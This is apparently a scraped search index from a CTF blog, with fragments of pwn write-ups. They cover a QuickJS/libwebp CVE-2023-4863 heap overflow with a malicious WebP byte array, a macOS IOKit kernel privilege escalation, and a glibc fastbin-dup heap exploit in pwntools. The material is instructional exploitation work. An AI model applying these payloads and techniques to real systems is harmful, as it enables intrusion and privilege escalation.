2023","uri":"/posts/asis-ctf-finals-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we received an attachment that included the modified quickjs, the altered libwebp, and a compile.sh script for compiling them. Let’s first take a look at the compile.sh file. #!/bin/sh rm build -r 2\u003e/dev/null mkdir build mkdir build/libwebp/ git clone https://chromium.googlesource.com/webm/libwebp/ cd libwebp git checkout 7ba44f80f3b94fc0138db159afea770ef06532a0 git apply ../libwebp.patch make -f ./makefile.unix -j4 find -name '*.a' | xargs -I '{}' cp '{}' ../build/libwebp cd .. git clone https://github.com/bellard/quickjs.git cd quickjs git checkout 2ee6be705fde0eb68acec25915d2947de1207abb git apply ../quickjs.patch cd .. cp ./quickjs/* ./build -r cd build make qjs -j4 realpath ./qjs Observing the script reveals that the libwebp version used is vulnerable to the recent exploit CVE-2023-4863. This CVE details an issue in libwebp related to constructing the Huffman Table, essential for compressing WebP images. WebP images use Huffman Coding for compression, and libwebp constructs a Huffman Table to decompress them. However, due to inadequate validity checks, it’s possible to craft a malicious WebP image that causes heap overflow during table construction. In search of a proof of concept (POC) online, we discovered a good POC containing a sample malicious WebP image. Before utilizing the malicious image, let’s first check the patches implemented by the author. Examining the libwebp.patch file, the only modification made by the author is the removal of the line of code (LOC) that frees the Huffman table. Therefore, in this challenge, once a Huffman table is allocated, it remains indefinitely. Next, let’s examine the quickjs.patch file. diff --git a/Makefile b/Makefile index 9b003f0..796c76f 100644 --- a/Makefile +++ b/Makefile @@ -108,10 +108,10 @@ ifdef CONFIG_WIN32 DEFINES+=-D__USE_MINGW_ANSI_STDIO # for standard snprintf behavior endif -CFLAGS+=$(DEFINES) +CFLAGS+=$(DEFINES) -I../libwebp/imageio/ -I../libwebp/src/ CFLAGS_DEBUG=$(CFLAGS) -O0 CFLAGS_SMALL=$(CFLAGS) -Os -CFLAGS_OPT=$(CFLAGS) -O2 +CFLAGS_OPT=$(CFLAGS) -O0 CFLAGS_NOLTO:=$(CFLAGS_OPT) LDFLAGS=-g ifdef CONFIG_LTO @@ -168,7 +168,7 @@ all: $(OBJDIR) $(OBJDIR)/quickjs.check.o $(OBJDIR)/qjs.check.o $(PROGS) QJS_LIB_OBJS=$(OBJDIR)/quickjs.o $(OBJDIR)/libregexp.o $(OBJDIR)/libunicode.o $(OBJDIR)/cutils.o $(OBJDIR)/quickjs-libc.o $(OBJDIR)/libbf.o -QJS_OBJS=$(OBJDIR)/qjs.o $(OBJDIR)/repl.o $(QJS_LIB_OBJS) +QJS_OBJS=$(OBJDIR)/qjs.o $(QJS_LIB_OBJS) ifdef CONFIG_BIGNUM QJS_OBJS+=$(OBJDIR)/qjscalc.o endif @@ -180,6 +180,7 @@ LIBS+=-ldl -lpthread endif LIBS+=$(EXTRA_LIBS) +LIBS+=libwebp/libimagedec.a libwebp/libwebpdemux.a libwebp/libimageenc.a libwebp/libimageio_util.a libwebp/libwebp.a libwebp/libsharpyuv.a $(OBJDIR): mkdir -p $(OBJDIR) $(OBJDIR)/examples $(OBJDIR)/tests diff --git a/qjs.c b/qjs.c index c2d63e9..c08c9a2 100644 --- a/qjs.c +++ b/qjs.c @@ -41,8 +41,8 @@ #include \"cutils.h\" #include \"quickjs-libc.h\" -extern const uint8_t qjsc_repl[]; -extern const uint32_t qjsc_repl_size; +// extern const uint8_t qjsc_repl[]; +// extern const uint32_t qjsc_repl_size; #ifdef CONFIG_BIGNUM extern const uint8_t qjsc_qjscalc[]; extern const uint32_t qjsc_qjscalc_size; @@ -118,8 +118,8 @@ static JSContext *JS_NewCustomContext(JSRuntime *rt) } #endif /* system modules */ - js_init_module_std(ctx, \"std\"); - js_init_module_os(ctx, \"os\"); + // js_init_module_std(ctx, \"std\"); + // js_init_module_os(ctx, \"os\"); return ctx; } @@ -338,6 +338,8 @@ int main(int argc, char **argv) } #endif + setbuf(stdout,NULL); + setbuf(stdin,NULL); /* cannot use getopt because we want to pass the command line to the script */ optind = 1; @@ -525,7 +527,8 @@ int main(int argc, char **argv) goto fail; } if (interactive) { - js_std_eval_binary(ctx, qjsc_repl, qjsc_repl_size, 0); + // js_std_eval_binary(ctx, qjsc_repl, qjsc_repl_size, 0); + exit(1); } js_std_loop(ctx); } diff --git a/qjsc.c b/qjsc.c index f8e60b3..23b9b00 100644 --- a/qjsc.c +++ b/qjsc.c @@ -509,8 +509,8 @@ int ","date":"Dec 30, 2023","objectID":"/posts/asis-ctf-finals-2023/:1:1","tags":["Writeup","ASIS CTF","pwn","quickjs","huffman","oob","2023"],"title":"ASIS CTF Finals 2023","uri":"/posts/asis-ctf-finals-2023/"},{"categories":null,"content":"Solution Testing the heap overflow First, let’s set up our helper. // Helper taken from https://changochen.github.io/2019-04-29-starctf-2019.html var f64 = new Float64Array(1); var u32 = new Uint32Array(f64.buffer); function d2u(v) { f64[0] = v; return u32; } function u2d(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; } function hex(lo, hi) { if( lo == 0 ) { return (\"0x\" + hi.toString(16) + \"00000000\"); } if( hi == 0 ) { return (\"0x\" + lo.toString(16)); } return (\"0x\" + ('00000000'+hi.toString(16)).substr(8) +('00000000'+lo.toString(16)).substr(8)); } Upon reviewing the information in the POC’s blog, we learn that the POC’s malicious image aims to overwrite chunk+0x3000. Let’s try to check what kind of overflow that it can trigger in the gdb. My approach to check about it is: Spray numerous pair of (ArrayBuffer with a size of 0x2f28 and Array with size 0x1). Free some of these ArrayBuffer objects. Attempt to allocate the Huffman table, hoping it occupies one of the freed ArrayBuffer chunks due to the same size. Inspect the value at chunk+0x3000 to analyze the effects of the overflow. const webp = new Uint8Array([82, 73, 70, 70, 136, 2, 0, 0, 87, 69, 66, 80, 86, 80, 56, 76, 123, 2, 0, 0, 47, 0, 0, 0, 16, 26, 15, 130, 36, 9, 146, 36, 73, 18, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 86, 207, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 221, 157, 7, 65, 146, 4, 73, 146, 36, 9, 48, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 50, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 179, 122, 118, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 247, 206, 131, 32, 73, 130, 36, 73, 146, 4, 24, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 89, 61, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 123, 231, 65, 144, 36, 65, 146, 36, 73, 2, 140, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 172, 158, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 189, 243, 32, 72, 146, 32, 73, 146, 36, 221, 221, 185, 187, 187, 187, 187, 187, 187, 71, 68, 68, 68, 68, 68, 68, 68","date":"Dec 30, 2023","objectID":"/posts/asis-ctf-finals-2023/:1:2","tags":["Writeup","ASIS CTF","pwn","quickjs","huffman","oob","2023"],"title":"ASIS CTF Finals 2023","uri":"/posts/asis-ctf-finals-2023/"},{"categories":null,"content":" 0CTF/TCTF 2023. We secured the first place I played with the Blue Water team in the 0CTF/TCTF 2023. We managed to secure the first place. A huge shoutout and thanks to my awesome teammates for their fantastic teamwork during it! Below is the writeup for the kernel pwn challenge called BabyKitDriver, which is a macOS Local Privilege Escalation challenge. Pwn ","date":"Dec 11, 2023","objectID":"/posts/0ctf-tctf-2023/:0:0","tags":["Writeup","0CTF","TCTF","0CTF/TCTF","pwn","kernel","race","macOS","lpe","oob","2023"],"title":"0CTF/TCTF 2023","uri":"/posts/0ctf-tctf-2023/"},{"categories":null,"content":"BabyKitDriver Description qemu+macOS ventura 13.6.1 upload your exploit binary and the server will run it for you, you can get the output of your exploit. the flag is at /flag Just pwn my first IOKit Driver! nc baby-kit-driver.ctf.0ops.sjtu.cn 20001 ","date":"Dec 11, 2023","objectID":"/posts/0ctf-tctf-2023/:1:0","tags":["Writeup","0CTF","TCTF","0CTF/TCTF","pwn","kernel","race","macOS","lpe","oob","2023"],"title":"0CTF/TCTF 2023","uri":"/posts/0ctf-tctf-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a kext folder which is a driver of macOS kernel. Based on the challenge description, seems like the given driver is an IOKit Driver. Our goal is to pwn the driver, so that we can do local privilege escalation in macOS through the vulnerable driver. There aren’t too many resources in the internet about it, but we found a good writeup which mentioned a book that can be read to understand the basic of how to communicate with IOKit driver. The book name is “OS X and iOS Kernel Programming”, which is very recommended to be read to help understand this challenge (Especially the chapter 5). Let’s start by disassembling the given driver. We observed that there are two main class exists on there, which is BabyKitDriver and BabyKitDriverUserClient. The book already mentioned that this is the typical of how IOKit driver looks like. Checking through the BabyKitDriver class, seems like there aren’t any interesting things, so we can shift our focus towards BabyKitDriverUserClient class, which is the one that we can interact with. Let’s start by checking the BabyKitDriverUserClient::externalMethod first, which will list the available methods that user can call from userland. __int64 __fastcall BabyKitDriverUserClient::externalMethod( OSObject *this, uint32_t selector, IOExternalMethodArguments *args, IOExternalMethodDispatch *dispatch, OSObject *target, void *reference) { IOLog(\"BabyKitDriverUserClient::externalMethod\\n\"); if ( selector \u003c 2 ) return ((unsigned int (__fastcall *)(BabyKitDriverUserClient *, uint32_t, IOExternalMethodArguments *, IOExternalMethodDispatch *, OSObject *, void *))`vtable for'IOUserClient.externalMethod)( (BabyKitDriverUserClient *)this, selector, args, (IOExternalMethodDispatch *)BabyKitDriverUserClient::sMethods + selector, this, 0LL); else return 0xE00002C7; } Taking a glance, seems like there are only two functions that we can interact with. Checking through the sMethods, which basically a list of IOExternalMethodDispatch, we can see that there are two functions that we can interact: BabyKitDriverUserClient::baby_read Checking through its attribute, we can call this function by passing 2 scalar inputs with no output. BabyKitDriverUserClient::baby_leaveMessage Checking through its attribute, we can call this function by passing 3 scalar inputs with no output. Let’s start by checking the baby_leaveMessage code first. __int64 __fastcall BabyKitDriverUserClient::baby_leaveMessage( OSObject *target, void *reference, IOExternalMethodArguments *args) { signed __int64 v4; // [rsp+0h] [rbp-80h] unsigned int v5; // [rsp+Ch] [rbp-74h] uint64_t v6; // [rsp+10h] [rbp-70h] __int64 v7; // [rsp+18h] [rbp-68h] v7 = ((__int64 (__fastcall *)(OSObject *))target-\u003e__vftable[5]._RESERVEDOSObject14)(target); v6 = *args-\u003escalarInput; IOLog(\"BabyKitDriverUserClient::baby_leaveMessage\\n\"); if ( !*(_QWORD *)(v7 + 0x90) ) { *(_QWORD *)(v7 + 0x90) = IOMalloc(0x300uLL); if ( v6 ) *(_QWORD *)(*(_QWORD *)(v7 + 0x90) + 8LL) = output2; else **(_QWORD **)(v7 + 0x90) = output1; } if ( v6 ) { *(_QWORD *)(*(_QWORD *)(v7 + 0x90) + 8LL) = output2; v4 = *((_QWORD *)args-\u003escalarInput + 2); if ( v4 \u003e 0x200LL ) v4 = 0x200LL; **(_QWORD **)(v7 + 0x90) = v4; v5 = copyin(*((_QWORD *)args-\u003escalarInput + 1), (void *)(*(_QWORD *)(v7 + 0x90) + 0x10LL), v4);// 2nd arg } else { **(_QWORD **)(v7 + 0x90) = output1; v5 = copyin(*((_QWORD *)args-\u003escalarInput + 1), (void *)(*(_QWORD *)(v7 + 0x90) + 8LL), 0x100uLL);// 2nd arg } *(_QWORD *)(v7 + 0x98) = v6; return v5; } __int64 __fastcall output1(char *a1, char *a2) { return __memcpy_chk(a1, a2, 0x100LL, -1LL); } __int64 __fastcall output2(char *a1, char *a2, __int64 a3) { return __memcpy_chk(a1, a2, a3, -1LL); } Looking through the above code, this function will try to allocate a heap chunk during the first time it was called, and store it into v7 +0x90. Based on our first argument, it will store a function pointer to chunk+0x0 or chunk+0x8, depends whether our first argu","date":"Dec 11, 2023","objectID":"/posts/0ctf-tctf-2023/:1:1","tags":["Writeup","0CTF","TCTF","0CTF/TCTF","pwn","kernel","race","macOS","lpe","oob","2023"],"title":"0CTF/TCTF 2023","uri":"/posts/0ctf-tctf-2023/"},{"categories":null,"content":"Solution Before crafting our solution, we need to setup debug environment first because this is a macOS kernel pwn challenge. Setup Debug Environment We use OSX-KVM as our macOS VM. Below is the step-by-step that we need to do so that we can successfully run the OSX-KVM in our local: Do everything that they mentioned in Installation Preparaion. During running the fetch-macOS-v2.py, we choose the Ventura option. However, the Ventura version that is fetched here is not the same version that is used in this challenge. We will need to do extra step later. For the virtual HDD image size, 64G is enough. Now, we need to follow the run_offline instructions, because we want to specifically install the 13.6.1 version. Make sure that you download the 13.6.1 installer. Make sure that during formatting the virtual HDD via the GUI Disk Utility: Named it as macOS. Use APFS filesystem. The documentation mentioned that it isn’t recommended to use APFS, but the VM won’t work if we didn’t use APFS. This is a very important step. When you successfully installed the VM, some extra steps that we did to make our debugging smoother: We enabled the remote login, so that we can interact via SSH and send/receive files via SCP. After enabling the remote login, we can simply use port 2222 to access the VM from the host. We copied the kernel image used in this OS, which can be found in the /System/Library/Kernels/kernel. Type gcc in terminal. You will be prompted to install some tools, and just press yes to it, so that we can compile our exploit in this VM. Download the kext challenge, and install it with sudo kextload BabyKitDriver.kext. We need to do this everytime we crashed. During the first time we do this, we will need to go to System Preferences to allow it to be installed (which will reboot the VM as well). VM is ready Now that we have running VM with driver of the challenge installed, and we can start crafting our exploit now. Getting Leak Let’s start by setting up some helpers to interact with the IOKit driver. Below is the helper that we made, mostly copying from this writeup and using ChatGPT :D. #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cfcntl.h\u003e #include \u003cunistd.h\u003e #include \u003cstring.h\u003e #include \u003csys/ioctl.h\u003e #include \u003cpthread.h\u003e #include \u003csched.h\u003e #include \u003cIOKit/IOKitLib.h\u003e #include \u003cCoreFoundation/CoreFoundation.h\u003e #include \u003cmach/mach.h\u003e #define kBabyRead 0 #define kLeaveMessage 1 #define kIOKitClassName \"BabyKitDriver\" #define KERNEL_BASE_NO_SLID 0xFFFFFF8000100000ULL uint64_t kbase, slide; io_connect_t connection; char ropChain[0x200]; int loop_end = 100000; // TODO: define gadgets and addresses that we need for ROP Chain void print_data(char *buf, size_t len) { puts(\"-----\"); for (int i = 0; i \u003c len; i += 8) { char* fmt_str; if ((i / 8) % 2 == 0) { fmt_str = \"0x%04x: 0x%016lx\"; printf(fmt_str, i, *(unsigned long*)\u0026buf[i]); } else { fmt_str = \" 0x%016lx\\n\"; printf(fmt_str, *(unsigned long*)\u0026buf[i]); } } puts(\"-----\"); } uint64_t GetKextAddr() { FILE *fp; char line[4096]; fp = popen(\"kextstat 2\u003e/dev/null | grep BabyKitDriver | awk '{print $3}'\",\"r\"); if(fp == NULL) { printf(\"Failed to get KEXT address!\\n\"); exit(-1); } fgets(line, sizeof(line)-1, fp); uint64_t addr = (uint64_t) strtoul(line, NULL, 16); fclose(fp); return addr; } void baby_read(void *buf, unsigned long size) { unsigned long args[2] = { (unsigned long)buf, size }; IOConnectCallScalarMethod(connection,kBabyRead,(const uint64_t*)args,2,0,0); } void leave_message(unsigned long msg_type, void *buf, unsigned long size) { unsigned long args[3] = { msg_type, (unsigned long)buf, size }; IOConnectCallScalarMethod(connection,kLeaveMessage,(const uint64_t*)args,3,0,0); } void babyKitConnect(io_connect_t *connection) { kern_return_t kr; io_service_t serviceObject; io_iterator_t iterator; CFDictionaryRef classToMatch; classToMatch = IOServiceMatching(kIOKitClassName); if (classToMatch == NULL) { printf(\"IOServiceMatching returned a NULL dictionary\\n\"); exit(-1); } serviceObject = IO","date":"Dec 11, 2023","objectID":"/posts/0ctf-tctf-2023/:1:2","tags":["Writeup","0CTF","TCTF","0CTF/TCTF","pwn","kernel","race","macOS","lpe","oob","2023"],"title":"0CTF/TCTF 2023","uri":"/posts/0ctf-tctf-2023/"},{"categories":null,"content":" Cyber Jawara 2023 During this weekend, I have been competing in the Cyber Jawara CTF 2023 with my local team, Fidethus. In this writeup, I will be sharing my solutions for some of the challenges that I solved. Pwn ","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:0:0","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"migrain Description simple migrain manager, i mean note 137.184.6.25 17001 ","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:1:0","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a binary called migrain. Let’s disassemble the binary and take a closer look at some important functions. main void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { chunk_struct main_arr; // [rsp+0h] [rbp-650h] BYREF unsigned __int64 v4; // [rsp+648h] [rbp-8h] v4 = __readfsqword(0x28u); pre_setup_17A1(); puts(\"Cyber Jawara 2023: Break this Notes with Infinite Loop\"); init_main_arr_1269(\u0026main_arr); main_func_1496(\u0026main_arr); } This is the main function, which will call two important functions, init_main_arr_1269 and main_func_1496. init_main_arr_1269 struct chunk_struct { uint8_t count; char *chunks[200]; }; chunk_struct *__fastcall init_main_arr_1269(chunk_struct *main_arr) { chunk_struct *result; // rax unsigned __int8 i; // [rsp+17h] [rbp-1h] result = main_arr; main_arr-\u003ecount = 0; for ( i = 0; i \u003c= 0xC7u; ++i ) { main_arr-\u003echunks[i] = 0LL; result = (chunk_struct *)((unsigned int)i + 1); } return result; } Ok, so we have a chunk_struct, which keep tracks the count of the total chunks, and it will nullify all the chunks first. main_func_1496 void __fastcall __noreturn main_func_1496(chunk_struct *main_arr) { int v1; // eax while ( 1 ) { v1 = print_menu_152E(); if ( v1 == 4 ) { cleanup_12AA((unsigned __int8 *)main_arr); puts(\"Exit....\"); exit(0); } if ( v1 \u003e 4 ) break; switch ( v1 ) { case 3: destroy_1705((__int64)main_arr); break; case 1: add_15FD(main_arr); break; case 2: view_1665((__int64)main_arr); break; default: goto LABEL_11; } } LABEL_11: exit(0); } This is the real main function, it has 4 menu, which are: add view destroy cleanup (I didn’t use this at all, so I won’t check this function). Let’s try to disassemble it one by one. add_15FD ssize_t __fastcall add_15FD(chunk_struct *main_arr) { void *s; // [rsp+18h] [rbp-8h] printf(\"Payload: \"); s = (void *)alloc_chunk_130D(main_arr); memset(s, 0, 0x64uLL); return read(0, s, 0x64uLL); } __int64 __fastcall alloc_chunk_130D(chunk_struct *main_arr) { uint8_t v1; // al char *ptr_to_data; // [rsp+18h] [rbp-8h] ptr_to_data = (char *)malloc(8uLL); *(_QWORD *)ptr_to_data = malloc(0x64uLL); v1 = main_arr-\u003ecount++; main_arr-\u003echunks[v1] = ptr_to_data; return *(_QWORD *)ptr_to_data; } So, this add functions will allocate two chunks (0x8 and 0x64) size. The smaller chunk will be used to store the pointer to the larger chunk, and the larger chunk will be used to store our payload. There are one interesting thing that we can see here: add doesn’t have any limit, we can add as many chunks as possible. However, remember that main_arr-\u003ecount is actually uint8, so if you add more than the uint8 limit, the count will be rest back to 0. view_1665 unsigned __int64 __fastcall view_1665(chunk_struct *main_arr) { const char *data; // rax int idx; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"Index: \"); if ( !(unsigned int)__isoc99_scanf(\"%d\", \u0026idx) ) exit(1); data = (const char *)get_chunk_136B(main_arr, idx); printf(\"Data: %s\\n\", data); return v4 - __readfsqword(0x28u); } __int64 __fastcall get_chunk_136B(chunk_struct *main_arr, uint8_t idx) { if ( idx \u003e= main_arr-\u003ecount || !main_arr-\u003echunks[idx] ) { puts(\"Note index out of range.\"); exit(1); } return *(_QWORD *)main_arr-\u003echunks[idx]; } This view functions will check whether our given idx is: Smaller than the current count Pointing to active chunk After this validation, it will return to use the contents of the chunk. destroy_1705 unsigned __int64 __fastcall destroy_1705(chunk_struct *main_arr) { int idx; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Enter the index of the note to destroy: \"); if ( !(unsigned int)__isoc99_scanf(\"%d\", \u0026idx) ) exit(1); check_destroy_13D1((unsigned __int8 *)main_arr, idx); main_arr-\u003echunks[idx] = 0LL; return v3 - __readfsqword(0x28u); } void __fastcall check_destroy_13D1(chunk_struct *main_arr, uint8_t idx) { if ( idx \u003e= main_arr-\u003ecou","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:1:1","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"Solution First, with the UAF bug, we can easily leak the heap address of the chunks, because after the chunks getting freed with negative index, we can still view the content of it, which now contains mangled pointer to the next freed chunk. Second, observe that we basically can only allocate chunk with size 0x70. This means that if we fulfill the tcache[0x70], the next freed chunks will go to fastbin. With the Double Free vulnerability that we can trigger as well, we can do fastbin dup attack, by doing a sequence of: free(a) free(b) free(a) The above sequence will cause the fastbin linked list will be like a -\u003e b -\u003e a, and this can be abused later. Stage 1: Leak heap \u0026 trigger fastbin dup First, let’s start by creating our helper to make our life easier. from pwn import p64, u64, p32, u32 from pwn import * exe = ELF(\"migrain_patched\") libc = ELF(\"./libc.so.6\") # ld = ELF(\"./ld-2.37.so\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") # remote_url = \"137.184.6.25\" remote_url = 'localhost' remote_port = 17001 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: # gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r def demangle(val, is_heap_base=False): if not is_heap_base: mask = 0xfff \u003c\u003c 52 while mask: v = val \u0026 mask val ^= (v \u003e\u003e 12) mask \u003e\u003e= 12 return val return val \u003c\u003c 12 def mangle(heap_addr, val): return (heap_addr \u003e\u003e 12) ^ val r = conn() # Max size = 0x64, chunk_size = 0x70 def add(payload): r.sendlineafter(b'\u003e\u003e ', b'1') r.sendafter(b'Payload: ', payload) def view(idx): r.sendlineafter(b'\u003e\u003e ', b'2') r.sendlineafter(b'Index: ', str(idx).encode()) r.recvuntil(b'Data: ') out = r.recvline().strip() return out def destroy(idx): r.sendlineafter(b'\u003e\u003e ', b'3') r.sendlineafter(b'destroy: ', str(idx).encode()) def neg(x): return x-256 Our first target is we want to get a heap leak and doing tcache poisoning. Let’s start by allocating a lot of chunks first, so that we can use negative index to trigger UAF and Double-Free later. for i in range(200): print(i) add(p8(i)*8) After allocating a lot of chunks, let’s try to fulfill the tcache. # Fulfill tcache for i in range(7): destroy(i) Let’s check in the gdb to ensure that tcache[0x70] is full. pwndbg\u003e bins tcachebins 0x70 [ 7]: 0x5613ef239620 —▸ 0x5613ef239590 —▸ 0x5613ef239500 —▸ 0x5613ef239470 —▸ 0x5613ef2393e0 —▸ 0x5613ef239350 —▸ 0x5613ef2392c0 ◂— 0x0 Because tcache[0x70] is now full, every time we free a new chunk, it will go to fastbin. Now, we can try to trigger fastbin dup like what I explained before. We will need to use negative index to trigger the double-free and UAF (to leak the heap address). destroy(neg(198)) destroy(neg(197)) destroy(neg(198)) out = u64(view(198)[:6].ljust(8, b'\\x00')) leaked_heap = demangle(out) info(f'{hex(leaked_heap) = }') Let’s check in the gdb to see the current fastbin state. pwndbg\u003e bins tcachebins 0x70 [ 7]: 0x5613ef239620 —▸ 0x5613ef239590 —▸ 0x5613ef239500 —▸ 0x5613ef239470 —▸ 0x5613ef2393e0 —▸ 0x5613ef239350 —▸ 0x5613ef2392c0 ◂— 0x0 fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x5613ef240210 —▸ 0x5613ef240180 ◂— 0x5613ef240210 As you can see, we successfully trigger it. We also get a heap leak from it. Now, the next stage is we need to leak libc address. Stage 2: Leak LIBC address Before trying to get a libc leak, you might be wondering why do we need to do the fastbin dup, what’s the purpose of it? To see what we can do with it, let’s try to empty the tcache first, because before we can use the freed chunk stored in the fastbin, tcache will be prioritized first by the glibc allocator. target = leaked_heap-0x6e80 # Empty tcache for i in range(7): fake_chunk = b'a'*0x30 fake_chunk += p64(0)+p64(0x31) fake_chunk += p64(mangle(target, 0x0)) add(fake_chunk) I will explain about the fake_chunk later, but for now, let’s focus on what happen after we emptied the tcache. A","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:1:2","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"pinkeye Description cant stop blinking when you got pinkeye 137.184.6.25 17003 ","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:2:0","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a binary called blink and a Dockerfile to build it locally. Taking a look in the given Dockerfile, we can see that blink is actually taken from an open source repository. Based on the information in the repository, blink is a virtual machine that can be used to emulate x86-64 programs. I was trying to clone the repository and try to read the source code, but it has too many codes and I’m too lazy to read it. So, I decided to blackbox this challenge, by trying to create a simple ELF, put it in the blink binary, and observe its behavior using gdb. Setup Debugging Environment First, we need to setup the debugging environment first. During the competition, trying to debug directly in the docker helps me a lot because the memory layout in my local and docker are different. So, let’s start by modifying the given Dockerfile and docker-compose.yml, so that we can debug it easily. For the Dockerfile, let’s remove user 1000 and install gdb and my favorite extension, pwndbg. Below is the modified Dockerfile. FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update RUN apt-get install python3 -qy RUN apt install git gdb nano -y RUN git clone https://github.com/pwndbg/pwndbg \u0026\u0026 \\ cd pwndbg \u0026\u0026 \\ ./setup.sh COPY ynetd / COPY chall /app RUN echo 'CJ2023{test_flag}' \u003e /flag-`tr -dc A-Za-z0-9 \u003c /dev/urandom | head -c 20`.txt WORKDIR /app EXPOSE 13337 CMD /ynetd -p 13337 \"timeout 60 python3 -u ./runner.py 2\u003e/dev/null\" We also need to modify the docker-compose.yml file so that we can debug running process with gdb. Below is the modified docker-compose.yml file. version: '3' services: blink: restart: always build: context: . working_dir: /app ports: - \"17003:13337\" # exposed:local cap_add: - SYS_PTRACE Now, build this container and we will be able to debug and replicate the remote environment as close as possible. We can simply go into the container bash, then run the gdb docker exec -it pinkeye_blink_1 /bin/bash root@7c95c1ab911f:/app# LC_CTYPE=C.UTF-8 gdb blink GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1 Copyright (C) 2022 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u003chttp://gnu.org/licenses/gpl.html\u003e This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \"show copying\" and \"show warranty\" for details. This GDB was configured as 